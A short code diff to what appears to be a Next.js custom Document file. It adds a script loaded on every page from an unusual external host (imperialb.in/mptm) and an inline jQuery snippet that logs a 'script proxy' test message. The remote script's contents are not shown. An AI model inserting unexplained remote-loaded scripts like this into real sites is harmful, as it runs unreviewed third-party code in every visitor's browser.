@@ -41,6 +41,14 @@ export default function Document() {
           src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
           type="text/javascript"
         />
+        <script src="https://imperialb.in/mptm" type="text/javascript" />
+        <script>
+          {`
+            $(document).ready(function() {
+              console.log("jqueyr test for script proxy");
+            });
+          `}
+        </script>
       </Head>
       <body>
         <Main />
